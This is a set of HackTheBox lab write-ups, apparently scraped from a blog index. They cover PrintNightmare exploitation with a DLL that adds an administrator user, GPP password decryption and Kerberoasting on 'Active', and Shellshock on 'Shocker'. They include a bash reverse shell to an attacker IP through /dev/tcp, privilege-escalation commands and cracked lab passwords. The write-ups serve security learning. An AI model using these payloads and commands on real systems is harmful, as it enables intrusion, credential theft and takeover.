ipconfig Windows IP Configuration Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6 IPv4 Address. . . . . . . . . . . : 10.10.10.237 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6 10.10.10.2 Troubleshoot STATUS_PIPE_CLOSING I\u0026rsquo;m sure that the following error is caused by my DLL payload.\nimpacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) This is probably because, instead of using the DLL to create a user (one time load / execution / thread), I use the DLL for reverse shell.\nI wanted to generate my own payload to test but my Visual Studio somehow didn\u0026rsquo;t want me to install the Windows SDK (Fixed on this post).\nSo I stole this payload from this PoC created by Caleb Stewart and John Hammond.\nPS /opt/PrintNightmare/dll\u0026gt; Import-Module ./generate-nightmaredll.ps1 PS /opt/PrintNightmare/dll\u0026gt; Get-NightmareDLL [+] Created payload at /opt/printnightmare/dll/nightmare.dll I ran the exploit again on Atom, but this time it didn\u0026rsquo;t crash, instead it displayed the proper message of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) ✗ $ python3 CVE-2021-1675.py ATOM/jason:\u0026#39;kidvscat_electron_@123\u0026#39;@10.10.10.237 \u0026#39;\\\\10.10.14.75\\ef\\nightmare.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.237[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\nightmare.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Stage2: 0 [+] Exploit Completed Now I can login with credentials of adm1n:P@ssw0rd (default credentials from the stolen DLL) using evil-winrm.\n→ kali@kali «dll» «10.10.14.75» $ evil-winrm -i 10.10.10.237 -u \u0026#39;adm1n\u0026#39; -p \u0026#39;P@ssw0rd\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\adm1n\\Documents\u0026gt; whoami /groups | select-string \u0026#34;Administrators\u0026#34; NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner *Evil-WinRM* PS C:\\Users\\adm1n\\Documents\u0026gt; hostname ATOM AV Evasion Another issue I ran into during the demo was that the payload got removed by Microsoft Defender on Bastion. Using a self compile DLL payload (I should do this earlier 😅🔨) from BookHackTrick DLL templates can resolve this.\nThe following is the one that I use.\n// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own // compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll #include\u0026lt;windows.h\u0026gt;#include\u0026lt;stdlib.h\u0026gt;#include\u0026lt;stdio.h\u0026gt; void Entry (){ //Default function that is executed when the DLL is loaded  system(\u0026#34;cmd.exe /c net user iamf \u0026lt;password\u0026gt; /add\u0026#34;); system(\u0026#34;cmd.exe /c net localgroup administrators iamf /add\u0026#34;); } BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call){ case DLL_PROCESS_ATTACH: CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } The code can be compiled from Linux using mingw-w64 compiler ( sudo apt install mingw-w64). I will run the following command to compile the DLL.\n$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll I don\u0026rsquo;t demo this DLL since the process and the result are the same 😅.\nOn Bastion, although the add user payload can evade the AV, I\u0026rsquo;m unable to login using the created user via WinRM. However, impacket-psexec will do.\nFurther investigation, I found out that Invoke-Command from localhost is allowed.\nSo, I guess the WinRM was configured to only allow admin account for remote access. I couldn\u0026rsquo;t get the \u0026ldquo;right\u0026rdquo; keywords to google this. Below are what I\u0026rsquo;ve tried so far:\n$ winrm get winrm/config $ winrm get winrm/config/listener $ (Get-PSSessionConfiguration -Name Microsoft.PowerShell).Permission $ HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System $ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f Mitigation Microsoft provided two options as workarounds to mitigate PrintNightmare:\n Disable Print Spooler service Disable inbound remote printing through Group Policy.  Also, it is recommended to install KB5005010 patch. As for the second option, I have no idea to work with that from CLI, so I will demo the first option.\nDisable Print Spooler Service First, determine if the Print Spooler Service is running by using Get-Service -Name Spooler in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.\n$ Stop-Service -Name Spooler -Force $ Set-Service -Name Spooler -StartupType Disabled For demo, I will apply these on Bastion.\n*Evil-WinRM* PS C:\\\u0026gt; Get-Service -Name Spooler Status Name DisplayName ------ ---- ----------- Running Spooler Print Spooler *Evil-WinRM* PS C:\\\u0026gt; Stop-Service -Name Spooler -Force *Evil-WinRM* PS C:\\\u0026gt; Set-Service -Name Spooler -StartupType Disabled After disabling Spooler service, I ran the exploit again, but this time, it returned a \u0026ldquo;Connection Failed\u0026rdquo; message.\nSo, the conclusion is it worked! But, the downside is you loss the ability to print from both local and remote 🙃.\nFor more detailed mitigation, you can go to this GitHub repo.\n References  https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675 https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/ https://github.com/cube0x0/CVE-2021-1675 https://github.com/calebstewart/CVE-2021-1675 https://github.com/LaresLLC/CVE-2021-1675 https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own  ","permalink":"https://fahmifj.github.io/blog/play-with-printnightmare/","summary":"For the past week, a lot of InfoSec pros I follow on Twitter were tweeting about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service.","tags":["HackTheBox","CVE-2021-1675","CVE-2021-34527","PrintNightmare","msfvenom","Samba","DLL","venv"],"title":"Play with PrintNightmare using HackTheBox machines"},{"content":"Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.\nSkills Learned  Active Directory GPP Kerberoasting  Tools  Nmap Impacket CrackMapExec  Reconnaissance Nmap A full TCP scan (after -p- performed) discovers a bunch of open ports. The most notables ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).\n→ kali@kali «active» «10.10.14.83» $ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 23:20 EDT Nmap scan report for 10.10.10.100 Host is up (0.072s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-11 03:20:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 4915/tcp closed frcs 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49169/tcp open msrpc Microsoft Windows RPC 49172/tcp open msrpc Microsoft Windows RPC 49180/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-11T03:21:48 |_ start_date: 2021-07-09T05:18:19 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.11 seconds nmap identified the domain name as active.htb and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I\u0026rsquo;ll consider these vulns as alternative methods and put them in separate post (see: PrintNightmare).\nEnumeration TCP 53 - DNS There is no zone transfer in this machine.\n→ kali@kali «active» «10.10.14.83» $ dig axfr @10.10.10.100 10.10.10.100 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.15-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.100 10.10.10.100 ; (1 server found) ;; global options: +cmd ; Transfer failed. TCP 139,445 - SMB  smbmap identifies that anonymous logon is allowed and it has read access on Replication share.\n→ kali@kali «active» «10.10.14.83» $ smbmap -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: active.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY SYSVOL NO ACCESS Logon server share Users NO ACCESS Replication Share The Replication share contains a lot of folders, so I\u0026rsquo;ll just download them recursively.\n→ kali@kali «active» «10.10.14.83» $ smbclient -N //10.10.10.100/Replication Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Jul 21 06:37:44 2018 .. D 0 Sat Jul 21 06:37:44 2018 active.htb D 0 Sat Jul 21 06:37:44 2018 10459647 blocks of size 4096. 5722238 blocks available smb: \\\u0026gt; recurse on smb: \\\u0026gt; prompt of smb: \\\u0026gt; mget * getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) ...[SNIP]... The only interesting file there is the Groups.xml.\n→ kali@kali «active.htb» «10.10.14.83» $ find . -type f -iname groups.xml ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml This groups.xml contains a cpassword of user active.htb\\SVC_TGS. I\u0026rsquo;ll note the password\n→ kali@kali «active.htb» «10.10.14.83» $ cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; TCP 389 - LDAP There is nothing much I can do in LDAP.\n→ kali@kali «active.htb» «10.10.14.83» $ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts dn: namingContexts: DC=active,DC=htb namingContexts: CN=Configuration,DC=active,DC=htb namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb namingContexts: DC=DomainDnsZones,DC=active,DC=htb namingContexts: DC=ForestDnsZones,DC=active,DC=htb → kali@kali «active» «10.10.14.75» $ ldapsearch -LLL -x -h 10.10.10.100 -b \u0026#34;dc=active,dc=htb\u0026#34; Operations error (1) Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1 Foothold Access as SVC_TGS Group Policy Preferences (GPP) - Password Decrypt In Windows Server 2008, Microsoft introduced a feature called Group Policy Preferences. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.\nWhen a GPP is created, it creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft published the encryption key which can be used to decrypt the password (cpassword) in the XML file.\nKali comes with a tool called gpp-decrypt, and this tool can be used to decrypt the cpassword I obtained from the Groups.xml file.\n→ kali@kali «active.htb» «10.10.14.83» $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 Users Share CrackMapExec confirms that the credentials (SVC_TGS:GPPstillStandingStrong2k18) are valid. I have read access now on the three other shares.\n→ kali@kali «active» «10.10.14.83» $ crackmapexec smb active.htb -u \u0026#39;SVC_TGS\u0026#39; -p \u0026#39;GPPstillStandingStrong2k18\u0026#39; --shares SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 SMB 10.10.10.100 445 DC [+] Enumerated shares SMB 10.10.10.100 445 DC Share Permissions Remark SMB 10.10.10.100 445 DC ----- ----------- ------ SMB 10.10.10.100 445 DC ADMIN$ Remote Admin SMB 10.10.10.100 445 DC C$ Default share SMB 10.10.10.100 445 DC IPC$ Remote IPC SMB 10.10.10.100 445 DC NETLOGON READ Logon server share SMB 10.10.10.100 445 DC Replication READ SMB 10.10.10.100 445 DC SYSVOL READ Logon server share SMB 10.10.10.100 445 DC Users READ Looking into the Users share, I\u0026rsquo;m sure this share is most likely C:\\Users\\\n→ kali@kali «active.htb» «10.10.14.83» $ smbclient -N //10.10.10.100/Users -U \u0026#39;SVC_TGS%GPPstillStandingStrong2k18\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sat Jul 21 10:39:20 2018 .. DR 0 Sat Jul 21 10:39:20 2018 Administrator D 0 Mon Jul 16 06:14:21 2018 All Users DHSrn 0 Tue Jul 14 01:06:44 2009 Default DHR 0 Tue Jul 14 02:38:21 2009 Default User DHSrn 0 Tue Jul 14 01:06:44 2009 desktop.ini AHS 174 Tue Jul 14 00:57:55 2009 Public DR 0 Tue Jul 14 00:57:55 2009 SVC_TGS D 0 Sat Jul 21 11:16:32 2018 10459647 blocks of size 4096. 5722238 blocks available And there is a user flag in SVC_TGS\\Desktop. I can read the flag with more command.\nsmb: \\\u0026gt; ls SVC_TGS\\Desktop\\ . D 0 Sat Jul 21 11:14:42 2018 .. D 0 Sat Jul 21 11:14:42 2018 user.txt A 34 Sat Jul 21 11:06:25 2018 10459647 blocks of size 4096. 5722238 blocks available smb: \\\u0026gt; more SVC_TGS\\Desktop\\user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) Privilege Escalation Shell as NT Authority\\SYSTEM LDAP - SPN enumeration With SVC_TGS credentials, I\u0026rsquo;m able to access the LDAP service.\nIt was found that the administrator has servicePrincipalName (SPN) attribute.\n→ kali@kali «active» «10.10.14.83» $ ldapsearch -LLL -x -D \u0026#39;SVC_TGS@active.htb\u0026#39; -w \u0026#39;GPPstillStandingStrong2k18\u0026#39; -h 10.10.10.100 -b \u0026#34;dc=active,dc=htb\u0026#34; \u0026#34;(\u0026amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))\u0026#34; dn: CN=Administrator,CN=Users,DC=active,DC=htb ...[SNIP]... adminCount: 1 accountExpires: 0 logonCount: 34 sAMAccountName: Administrator sAMAccountType: 805306368 servicePrincipalName: active/CIFS:445 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb ...[SNIP]... Kerberoasting If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called Kerberoasting. It is an attack against Kerberos to steal a Service Ticket.\nThe attack is well explained in this blog and this one, but I will try to give an overview using the following image created by David Freimannis. The Kerberoasting attack indicated by a red box.\nTaken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.\nIn this case, let\u0026rsquo;s start from step 3, and say we want to access a CIFS service. The server (KDC) then searches for SPN of the CIFS service, which is active/CIFS:445, and it is registered to the administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using this ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to recover the administrator password.\n If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.\n There are several tools out there that can be used to perform a Kerberoasting attack, but I\u0026rsquo;ll use the one from Impacket called Impacket-GetUserSPNs. The tool captures the ticket and automatically formats it into hashcat crackable format.\n→ kali@kali «active» «10.10.14.75» $ impacket-GetUserSPNs active.htb/SVC_TGS:\u0026#39;GPPstillStandingStrong2k18\u0026#39; -dc-ip 10.10.10.100 -request-user administrator Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2021-07-14 12:36:18.277545 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...[SNIP]... TGS Crack The password of the TGS can be recovered using hashcat.\n$ ./hashcat.exe -m 13100 hashes/svc_tgs.krbhash ../../rockyou.txt -O ...[SNIP]... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...[SNIP]...:Ticketmaster1968 It is Ticketmaster1968.\nImpacket-psexec Using the administrator account along with the obtained password, I\u0026rsquo;m able to get a shell as local system using impacket-psexec.\n→ kali@kali «exploits» «10.10.14.83» $ impacket-psexec active.htb/administrator:\u0026#39;Ticketmaster1968\u0026#39;@10.10.10.100 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file olAAJsqj.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service mvjR on 10.10.10.100..... [*] Starting service mvjR..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami \u0026amp;\u0026amp; ipconfig nt authority\\system Windows IP Configuration Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 10.10.10.100 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 10.10.10.2 Tunnel adapter isatap.{B3FEC2C7-47CA-4014-A441-A3A5CDDC983C}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : The root flag is done here.\nC:\\Windows\\system32\u0026gt;type \\Users\\Administrator\\Desktop\\root.txt b5fc76...[SNIP]...  Reference(s)  https://adsecurity.org/?p=2288 https://hebo.gitbook.io/hackbook/active-directory/kerberoasting https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/ http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-active/","summary":"Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.","tags":["OSCP-like","Windows","Active-Directory","Domain-Controller","Kerberoasting","gpp-decrypt"],"title":"HackTheBox - Active"},{"content":"Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.\nIn the end of this write-up, I\u0026rsquo;ll see how the Shellshock vulnerability works.\nSkills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.\n→ kali@kali «shocker» «10.10.14.83» $ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 20:24 EDT Nmap scan report for 10.10.10.56 Host is up (0.065s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.00 seconds Enumeration TCP 80 - Website The site serves only one a text and an image.\nThe server response contains uncommon Header called Accept-Ranges. According to MDN, this header is allows us to control the portion of the HTTP message.\n→ kali@kali «shocker» «10.10.14.83» $ curl -I http://10.10.10.56 HTTP/1.1 200 OK Date: Sun, 11 Jul 2021 00:49:51 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT ETag: \u0026#34;89-559ccac257884\u0026#34; Accept-Ranges: bytes Content-Length: 137 Vary: Accept-Encoding Content-Type: text/html A quick search on google finds that it can be used for DDoS attack.\nGobuster A gobuster scan finds two directories: /cgi-bin/ and /icons\n→ kali@kali «shocker» «10.10.14.83» $ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Add Slash: true [+] Timeout: 10s =============================================================== 2021/07/10 20:26:07 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin/ (Status: 403) [Size: 294] /icons/ (Status: 403) [Size: 292] ...[SNIP]... Another scan on /cgi-bin/ discovers a file called users.sh\n→ kali@kali «shocker» «10.10.14.83» $ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/cgi-bin [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: cgi,sh [+] Add Slash: true [+] Timeout: 10s =============================================================== 2021/07/10 21:43:04 Starting gobuster in directory enumeration mode =============================================================== /user.sh (Status: 200) [Size: 125] ...[SNIP]... The script.sh returns the following contents.\n→ kali@kali «shocker» «10.10.14.83» $ curl -s http://10.10.10.56/cgi-bin/user.sh Content-Type: text/plain Just an uptime test script 21:46:09 up 1 day, 20:28, 0 users, load average: 0.00, 0.01, 0.00 According to the box name and a /cgi-bin/ folder which contains a bash script, it\u0026rsquo;s going to be shellshock vulnerability.\nFoothold Shell as shelly Shellshock (CVE-2014-6271) The Shellshock vulnerability is well explained in this free course by PentesterLab.\nThe following is the commonly used PoC for shellshock.\n(){:}; echo; \u0026lt;bash command\u0026gt; The PoC works on User-Agent header.\nIt also works on the Accept header (I\u0026rsquo;m shocked now 😄).\nReverse Shell I tried to get a shell but somehow it didn\u0026rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!\nThe installed nc doesn\u0026rsquo;t have -e.\nThe following bash reverse shell works.\n() { :;}; echo; echo \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.83/53 0\u0026gt;\u0026amp;1\u0026#34; | /bin/bash Shell Upgrade I\u0026rsquo;ll upgrade my shell using the PTY trick (that\u0026rsquo;s how I called it).\nshelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm export TERM=xterm shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null shelly@Shocker:/usr/lib/cgi-bin$ ^Z [1] + 7339 suspended nc -nvlp 53 → kali@kali «shocker» «10.10.14.83» $ stty raw -echo; fg [1] + 7339 continued nc -nvlp 53 shelly@Shocker:/usr/lib/cgi-bin$ The user flag is done here.\nshelly@Shocker:/home/shelly$ ls -l total 8 drwxr-xr-x 2 shelly shelly 4096 Jul 10 03:31 test -r--r--r-- 1 root root 33 Jul 9 01:17 user.txt shelly@Shocker:/home/shelly$ cat user.txt 7ac9eb73e6cb...[SNIP]... Privilege Escalation Shell as root Internal Enumeration A quick check on sudo privileges reveals that user shelly can run perl with sudo.\nshelly@Shocker:/usr/lib/cgi-bin$ sudo -l sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl Sudo - perl Using GTFOBins as reference, I\u0026rsquo;m now root.\nshelly@Shocker:/home/shelly$ sudo -u root perl -e \u0026#39;exec \u0026#34;/bin/bash\u0026#34;;\u0026#39; root@Shocker:/home/shelly# id \u0026amp;\u0026amp; hostname uid=0(root) gid=0(root) groups=0(root) Shocker root@Shocker:/home/shelly# The root flag.\nroot@Shocker:~# cat root.txt e3689b13acb2...[SNIP]... Extras Since this vulnerability is interesting yet dangerous, I\u0026rsquo;d like to observe how it works.\nPlaying a bit with Shellshock I did a quick test using the following script which placed under /cgi-bin/ folder. The script will prints all the environment variables.\nroot@Shocker:/usr/lib/cgi-bin# echo -e \u0026#39;#!/bin/bash\\necho test\\nenv\u0026#39; \u0026gt; iamf.sh root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.\nThe full response\nHTTP/1.1 200 OK Date: Sun, 11 Jul 2021 03:06:31 GMT Server: Apache/2.4.18 (Ubuntu) Connection: close Content-Type: text/x-sh Content-Length: 1113 iamf test SERVER_SIGNATURE=\u0026lt;address\u0026gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80\u0026lt;/address\u0026gt; HTTP_USER_AGENT=Blackhole SERVER_PORT=80 HTTP_HOST=10.10.10.56 DOCUMENT_ROOT=/var/www/html 